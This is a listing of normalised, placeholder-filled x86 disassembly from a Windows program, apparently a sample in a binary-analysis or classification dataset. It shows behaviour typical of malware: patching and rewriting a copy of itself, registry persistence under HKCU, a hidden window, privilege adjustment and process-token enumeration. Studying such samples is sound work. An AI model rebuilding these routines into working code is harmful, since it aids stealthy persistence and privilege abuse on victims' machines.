mov eax [ ebp - 0x4 ]
leave
retn 0x4
call rand
cdq
push 0x1a
pop ecx
idiv ecx
add edx 0x61
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov [ eax ] dl
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
sub_405bd3
push ebp
mov ebp esp
sub esp 0x6c
push esi
push edi
mov [ ebp - 0x44 ] ecx
push 0x800
push 0x0
mov eax [ ebp - 0x44 ]
push [ eax + 0x98 ]
call memset
add esp 0xc
mov eax [ ebp - 0x44 ]
mov eax [ eax + 0x98 ]
dec eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x49 ] al
inc [ ebp - 0x48 ]
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov edi [ ebp - 0x48 ]
push 0x3a
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x44 ]
mov eax [ eax + 0x98 ]
dec eax
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x50 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x51 ] al
inc [ ebp - 0x50 ]
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
mov edi [ ebp - 0x50 ]
push 0x6
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x44 ]
mov eax [ eax + 0x98 ]
dec eax
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x58 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x59 ] al
inc [ ebp - 0x58 ]
cmp [ ebp - 0x59 ] 0x0
jne r-xdata
mov edi [ ebp - 0x58 ]
push 0x29
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov eax [ ebp - 0x44 ]
push [ eax + 0x98 ]
push 0x0
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x44 ]
call sub_404d9e
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jg r-xdata
mov eax [ ebp - 0x44 ]
push [ eax + 0xa8 ]
push r--data
push r--data
mov ecx [ ebp - 0x44 ]
call sub_4051ab
movzx eax al
test eax eax
je r-xdata
xor al al
jmp r-xdata
lea ecx [ ebp - 0x5 ]
call sub_40436d
mov eax [ ebp - 0x44 ]
push [ eax + 0xb4 ]
mov eax [ ebp - 0x44 ]
push [ eax + 0x88 ]
lea ecx [ ebp - 0x5 ]
call sub_4043da
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
push r--data
mov eax [ ebp - 0x44 ]
push [ eax + 0xa8 ]
call sub_401629
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn 0xc
mov [ ebp - 0x3d ] 0x1
lea ecx [ ebp - 0x5 ]
call sub_4034f0
mov al [ ebp - 0x3d ]
push [ ebp - 0x4 ]
mov eax [ ebp - 0x44 ]
push [ eax + 0xb4 ]
push [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
call sub_405054
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor al al
jmp r-xdata
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x14 ] eax
push 0x104
push [ ebp - 0x20 ]
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x3
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x18 ] eax
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x10 ] eax
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x1c ] eax
push 0xa
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x24 ] eax
push [ ebp - 0x24 ]
push [ ebp - 0x1c ]
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push [ ebp - 0x20 ]
call _splitpath
add esp 0x14
push r--data
push [ ebp + 0xc ]
call sub_401629
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
push [ ebp - 0x18 ]
push r--data
push [ ebp + 0x10 ]
call sprintf
add esp 0x14
mov eax [ ebp + 0xc ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x60 ]
mov al [ eax ]
mov [ ebp - 0x69 ] al
mov eax [ ebp - 0x64 ]
mov cl [ ebp - 0x69 ]
mov [ eax ] cl
mov eax [ ebp - 0x60 ]
inc eax
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x64 ]
inc eax
mov [ ebp - 0x64 ] eax
cmp [ ebp - 0x69 ] 0x0
jne r-xdata
jmp r-xdata
sub_405e48
push ebp
mov ebp esp
sub esp 0xbc
push esi
push edi
push 0x80
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x8 ] eax
push 0x40
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x2c ] eax
push 0x80
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x40 ] eax
push 0x64
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x48 ] eax
push [ ebp - 0x48 ]
push [ ebp - 0x8 ]
push [ ebp - 0x2c ]
push r--data
push [ ebp + 0x8 ]
call sscanf
add esp 0x14
push r--data
push [ ebp - 0x2c ]
call sub_401629
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x38 ] eax
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x14 ] eax
push 0x104
push [ ebp - 0x38 ]
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x3
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x1c ] eax
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x10 ] eax
push 0x104
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x74 ] eax
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x28 ] eax
push 0xa
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x78 ] eax
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x4c ] eax
push [ ebp - 0x4c ]
push [ ebp - 0x28 ]
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x38 ]
call _splitpath
add esp 0x14
push r--data
push [ ebp - 0x48 ]
call sub_401629
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
call printf
pop ecx
xor al al
jmp r-xdata
push [ ebp - 0x48 ]
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push r--data
push [ ebp - 0x14 ]
call sprintf
add esp 0x14
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x80 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x88 ] eax
pop edi
pop esi
leave
retn
push 0x0
push [ ebp - 0x34 ]
call [ GetFileSize@IAT ]
mov [ ebp - 0x44 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x2
push 0x40000000
push [ ebp - 0x14 ]
call [ CreateFileA@IAT ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x80 ]
mov al [ eax ]
mov [ ebp - 0x89 ] al
mov eax [ ebp - 0x84 ]
mov cl [ ebp - 0x89 ]
mov [ eax ] cl
mov eax [ ebp - 0x80 ]
inc eax
mov [ ebp - 0x80 ] eax
mov eax [ ebp - 0x84 ]
inc eax
mov [ ebp - 0x84 ] eax
cmp [ ebp - 0x89 ] 0x0
jne r-xdata
jmp r-xdata
push [ ebp - 0x44 ]
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x7c ]
mov [ ebp - 0xc ] eax
and [ ebp - 0x20 ] 0x0
push 0x0
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
push [ ebp - 0xc ]
push [ ebp - 0x34 ]
call [ ReadFile@IAT ]
push [ ebp - 0x34 ]
call [ CloseHandle@IAT ]
and [ ebp - 0x50 ] 0x0
jmp r-xdata
xor al al
jmp r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push [ ebp - 0x38 ]
call [ CreateFileA@IAT ]
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x44 ]
sub eax 0x64
cmp [ ebp - 0x50 ] eax
jae r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x90 ] r--data
mov eax [ ebp - 0x90 ]
inc eax
mov [ ebp - 0x94 ] eax
push [ ebp - 0x18 ]
call [ CloseHandle@IAT ]
xor al al
push 0xc0
push 0x0
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x20 ]
push eax
call memset
add esp 0xc
push [ ebp - 0x40 ]
push [ ebp - 0x8 ]
call sub_4054b8
pop ecx
pop ecx
mov eax [ ebp - 0x40 ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp - 0xa0 ]
inc eax
mov [ ebp - 0xa4 ] eax
mov eax [ ebp - 0x90 ]
mov al [ eax ]
mov [ ebp - 0x95 ] al
inc [ ebp - 0x90 ]
cmp [ ebp - 0x95 ] 0x0
jne r-xdata
mov eax [ ebp - 0x90 ]
sub eax [ ebp - 0x94 ]
mov [ ebp - 0x9c ] eax
mov ecx [ ebp - 0x9c ]
mov edi r--data
mov esi [ ebp - 0xc ]
add esi [ ebp - 0x50 ]
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov eax [ ebp - 0xa0 ]
mov al [ eax ]
mov [ ebp - 0xa5 ] al
inc [ ebp - 0xa0 ]
cmp [ ebp - 0xa5 ] 0x0
jne r-xdata
mov eax [ ebp - 0xa0 ]
sub eax [ ebp - 0xa4 ]
mov [ ebp - 0xac ] eax
push [ ebp - 0xac ]
push [ ebp - 0x40 ]
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x20 ]
push eax
call memcpy
add esp 0xc
push [ ebp - 0x40 ]
push [ ebp - 0x2c ]
call sub_4054b8
pop ecx
pop ecx
mov eax [ ebp - 0x40 ]
mov [ ebp - 0xb0 ] eax
mov eax [ ebp - 0xb0 ]
inc eax
mov [ ebp - 0xb4 ] eax
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov eax [ ebp - 0xb0 ]
mov al [ eax ]
mov [ ebp - 0xb5 ] al
inc [ ebp - 0xb0 ]
cmp [ ebp - 0xb5 ] 0x0
jne r-xdata
mov eax [ ebp - 0xb0 ]
sub eax [ ebp - 0xb4 ]
mov [ ebp - 0xbc ] eax
push [ ebp - 0xbc ]
push [ ebp - 0x40 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
lea eax [ ecx + eax + 0x80 ]
push eax
call memcpy
add esp 0xc
push 0x0
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
push [ ebp - 0xc ]
push [ ebp - 0x18 ]
call [ WriteFile@IAT ]
push [ ebp - 0x18 ]
call [ CloseHandle@IAT ]
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x50 ]
inc eax
mov [ ebp - 0x50 ] eax
sub_406238
push ebp
mov ebp esp
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
and [ ebp - 0x114 ] 0x0
mov [ ebp - 0x110 ] 0x0
push 0x103
push 0x0
lea eax [ ebp - 0x10f ]
push eax
call memset
add esp 0xc
push 0x104
lea eax [ ebp - 0x110 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x114 ]
push eax
push 0xf003f
push 0x0
push r--data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x118 ] 0x1
push 0x0
push 0x0
lea eax [ ebp - 0x118 ]
push eax
push 0x0
push r--data
push [ ebp - 0x114 ]
call [ RegQueryValueExA@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_4097f0
leave
retn
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
push [ ebp - 0x114 ]
call [ RegCloseKey@IAT ]
xor eax eax
inc eax
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x11c ] eax
mov eax [ ebp - 0x11c ]
inc eax
mov [ ebp - 0x120 ] eax
xor eax eax
inc eax
mov eax [ ebp - 0x11c ]
mov al [ eax ]
mov [ ebp - 0x121 ] al
inc [ ebp - 0x11c ]
cmp [ ebp - 0x121 ] 0x0
jne r-xdata
mov eax [ ebp - 0x11c ]
sub eax [ ebp - 0x120 ]
mov [ ebp - 0x128 ] eax
mov eax [ ebp - 0x128 ]
inc eax
push eax
lea eax [ ebp - 0x110 ]
push eax
push 0x1
push 0x0
push r--data
push [ ebp - 0x114 ]
call [ RegSetValueExA@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push [ ebp - 0x114 ]
call [ RegCloseKey@IAT ]
xor eax eax
jmp r-xdata
push [ ebp - 0x114 ]
call [ RegCloseKey@IAT ]
xor eax eax
inc eax
jmp r-xdata
sub_4063af
push ebp
mov ebp esp
sub esp 0x1a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8c ] eax
push r--data
push [ ebp + 0x10 ]
call sub_401629
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x80
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x190 ] eax
mov eax [ ebp - 0x190 ]
mov [ ebp - 0x8 ] eax
push 0x40
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x194 ] eax
mov eax [ ebp - 0x194 ]
mov [ ebp - 0x18c ] eax
push 0x80
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x198 ] eax
mov eax [ ebp - 0x198 ]
mov [ ebp - 0x4 ] eax
push [ ebp - 0x8 ]
push r--data
call sub_405609
pop ecx
pop ecx
push [ ebp - 0x18c ]
push r--data
call sub_405609
pop ecx
pop ecx
lea ecx [ ebp - 0x188 ]
call sub_4035d4
lea ecx [ ebp - 0x68 ]
call sub_401000
push [ ebp - 0x8 ]
push [ ebp - 0x18c ]
push r--data
lea eax [ ebp - 0x188 ]
push eax
lea ecx [ ebp - 0x68 ]
call sub_40163b
lea ecx [ ebp - 0x68 ]
call sub_401f0d
push 0x64
push rw-data
push 0x67
push [ ebp + 0x8 ]
call [ LoadStringA@IAT ]
push 0x64
push rw-data
push 0x6d
push [ ebp + 0x8 ]
call [ LoadStringA@IAT ]
push [ ebp + 0x8 ]
call sub_40657d
pop ecx
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_4065f9
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
call sub_405e48
pop ecx
xor eax eax
jmp r-xdata
push 0x6d
push [ ebp + 0x8 ]
call [ LoadAcceleratorsA@IAT ]
mov [ ebp - 0x6c ] eax
and [ ebp - 0x19c ] 0x0
lea ecx [ ebp - 0x68 ]
call sub_4034f0
lea ecx [ ebp - 0x188 ]
call sub_40366c
mov eax [ ebp - 0x19c ]
jmp r-xdata
mov ecx [ ebp - 0x8c ]
xor ecx ebp
call sub_4097f0
leave
retn 0x10
mov eax [ ebp - 0x80 ]
mov [ ebp - 0x1a0 ] eax
lea ecx [ ebp - 0x68 ]
call sub_4034f0
lea ecx [ ebp - 0x188 ]
call sub_40366c
mov eax [ ebp - 0x1a0 ]
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x6c ]
push [ ebp - 0x88 ]
call [ TranslateAcceleratorA@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x88 ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x88 ]
push eax
call [ DispatchMessageA@IAT ]
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x88 ]
push eax
call [ GetMessageA@IAT ]
test eax eax
je r-xdata
sub_40657d
push ebp
mov ebp esp
sub esp 0x30
mov [ ebp - 0x30 ] 0x30
mov [ ebp - 0x2c ] 0x3
mov [ ebp - 0x28 ] sub_406659
and [ ebp - 0x24 ] 0x0
and [ ebp - 0x20 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
push 0x7f05
push [ ebp + 0x8 ]
call [ LoadIconA@IAT ]
mov [ ebp - 0x18 ] eax
push 0x7f00
push 0x0
call [ LoadCursorA@IAT ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x6
mov [ ebp - 0xc ] 0x6d
mov [ ebp - 0x8 ] rw-data
push 0x7f05
push [ ebp - 0x1c ]
call [ LoadIconA@IAT ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x30 ]
push eax
call [ RegisterClassExA@IAT ]
leave
retn
sub_4065f9
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
push 0x0
push [ ebp + 0x8 ]
push 0x0
push 0x0
push 0x0
push 0x80000000
push 0x0
push 0x80000000
push 0xcf0000
push rw-data
push rw-data
push 0x0
call [ CreateWindowExA@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push 0x0
push [ ebp - 0x4 ]
call [ ShowWindow@IAT ]
push [ ebp - 0x4 ]
call [ UpdateWindow@IAT ]
xor eax eax
inc eax
xor eax eax
jmp r-xdata
leave
retn
sub_406659
push ebp
mov ebp esp
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x58 ] 0x2
je r-xdata
push 0x0
call [ PostQuitMessage@IAT ]
jmp r-xdata
cmp [ ebp - 0x58 ] 0xf
je r-xdata
xor eax eax
lea eax [ ebp - 0x48 ]
push eax
push [ ebp + 0x8 ]
call [ BeginPaint@IAT ]
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x48 ]
push eax
push [ ebp + 0x8 ]
call [ EndPaint@IAT ]
jmp r-xdata
cmp [ ebp - 0x58 ] 0x11
je r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x58 ] 0x16
je r-xdata
call sub_406238
call sub_406238
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp [ ebp - 0x58 ] 0x111
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4097f0
leave
retn 0x10
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
and eax 0xffff
movzx eax ax
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0x10 ]
shr eax 0x10
and eax 0xffff
movzx eax ax
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x5c ] 0x69
je r-xdata
jmp r-xdata
push [ ebp + 0x8 ]
call [ DestroyWindow@IAT ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ DefWindowProcA@IAT ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ DefWindowProcA@IAT ]
jmp r-xdata
sub_406773
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
leave
retn
mov eax [ ebp - 0x4 ]
push [ eax + 0x4 ]
call free
pop ecx
sub_406791
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x2000
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call malloc
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
leave
retn
push 0x0
push [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
push [ eax + 0x4 ]
push 0x5
mov eax [ ebp - 0x8 ]
call [ eax ]
cmp eax 0xc0000004
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x2000
mov [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
push [ eax + 0x4 ]
call realloc
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
sub_4067ff
push ebp
mov ebp esp
sub esp 0x474
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov [ ebp - 0x42c ] ecx
mov [ ebp - 0x319 ] 0x0
mov [ ebp - 0x428 ] 0x0
push 0x103
push 0x0
lea eax [ ebp - 0x427 ]
push eax
call memset
add esp 0xc
mov [ ebp - 0x110 ] 0x0
push 0x103
push 0x0
lea eax [ ebp - 0x10f ]
push eax
call memset
add esp 0xc
mov ecx [ ebp - 0x42c ]
call sub_406791
push 0x208
push 0x0
lea eax [ ebp - 0x318 ]
push eax
call memset
add esp 0xc
push 0x104
push 0x0
lea eax [ ebp - 0x110 ]
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x318 ]
push eax
mov eax [ ebp - 0x42c ]
mov eax [ eax + 0x4 ]
push [ eax + 0x44 ]
mov ecx [ ebp - 0x42c ]
call sub_406bde
push 0x0
push 0x0
push 0x104
lea eax [ ebp - 0x428 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x42c ]
mov eax [ eax + 0x4 ]
push [ eax + 0x3c ]
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
lea eax [ ebp - 0x428 ]
push eax
mov eax [ ebp - 0x42c ]
mov eax [ eax + 0x4 ]
push [ eax + 0x44 ]
push r--data
lea eax [ ebp - 0x110 ]
push eax
call sprintf
add esp 0x10
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x430 ] eax
mov eax [ ebp - 0x430 ]
mov [ ebp - 0x434 ] eax
mov [ ebp - 0x319 ] 0x1
mov eax [ ebp - 0x430 ]
mov al [ eax ]
mov [ ebp - 0x435 ] al
inc [ ebp - 0x430 ]
cmp [ ebp - 0x435 ] 0x0
jne r-xdata
mov eax [ ebp - 0x430 ]
sub eax [ ebp - 0x434 ]
mov ecx [ ebp - 0x434 ]
mov [ ebp - 0x43c ] ecx
mov [ ebp - 0x440 ] eax
mov eax [ ebp + 0x8 ]
dec eax
mov [ ebp - 0x444 ] eax
mov eax [ ebp - 0x444 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x445 ] al
inc [ ebp - 0x444 ]
cmp [ ebp - 0x445 ] 0x0
jne r-xdata
mov edi [ ebp - 0x444 ]
mov esi [ ebp - 0x43c ]
mov eax [ ebp - 0x440 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push 0x104
push 0x0
lea eax [ ebp - 0x110 ]
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x214 ]
mov [ ebp - 0x44c ] eax
mov eax [ ebp - 0x44c ]
inc eax
mov [ ebp - 0x450 ] eax
mov eax [ ebp - 0x44c ]
mov al [ eax ]
mov [ ebp - 0x451 ] al
inc [ ebp - 0x44c ]
cmp [ ebp - 0x451 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44c ]
sub eax [ ebp - 0x450 ]
mov [ ebp - 0x458 ] eax
je r-xdata
lea eax [ ebp - 0x318 ]
push eax
push r--data
lea eax [ ebp - 0x110 ]
push eax
call sprintf
add esp 0xc
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push r--data
lea eax [ ebp - 0x110 ]
push eax
call sprintf
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x45c ]
mov al [ eax ]
mov [ ebp - 0x461 ] al
inc [ ebp - 0x45c ]
cmp [ ebp - 0x461 ] 0x0
jne r-xdata
mov eax [ ebp - 0x45c ]
sub eax [ ebp - 0x460 ]
mov ecx [ ebp - 0x460 ]
mov [ ebp - 0x468 ] ecx
mov [ ebp - 0x46c ] eax
mov eax [ ebp + 0x8 ]
dec eax
mov [ ebp - 0x470 ] eax
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x45c ] eax
mov eax [ ebp - 0x45c ]
mov [ ebp - 0x460 ] eax
mov eax [ ebp - 0x470 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x471 ] al
inc [ ebp - 0x470 ]
cmp [ ebp - 0x471 ] 0x0
jne r-xdata
mov edi [ ebp - 0x470 ]
mov esi [ ebp - 0x468 ]
mov eax [ ebp - 0x46c ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x42c ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x42c ]
mov ecx [ ecx + 0x4 ]
add ecx [ eax ]
mov eax [ ebp - 0x42c ]
mov [ eax + 0x4 ] ecx
movzx eax [ ebp - 0x319 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x42c ]
mov eax [ eax + 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4097f0
leave
retn 0x4
sub_406b25
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jne r-xdata
leave
retn
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
sub_406b52
push ebp
mov ebp esp
sub esp 0x20
mov [ ebp - 0x20 ] ecx
lea eax [ ebp - 0x4 ]
push eax
push 0x20028
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
push 0x0
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x1c ] 0x1
mov eax [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
neg eax
sbb eax eax
and eax 0x2
mov [ ebp - 0x10 ] eax
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push [ ebp - 0x4 ]
call [ AdjustTokenPrivileges@IAT ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
xor eax eax
inc eax
jmp r-xdata
leave
retn 0x8
sub_406bde
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_409952
mov eax [ fs : 0x0 ]
push eax
push ecx
push ecx
sub esp 0x34
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x48 ] ecx
and [ ebp - 0x24 ] 0x0
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
push 0x0
push 0x400
call [ OpenProcess@IAT ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x8
push [ ebp - 0x28 ]
call [ OpenProcessToken@IAT ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
jmp r-xdata
and [ ebp - 0x38 ] 0x0
lea eax [ ebp - 0x38 ]
push eax
push 0x0
push 0x0
push 0x1
push [ ebp - 0x20 ]
call [ GetTokenInformation@IAT ]
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x38 ] 0x0
jb r-xdata
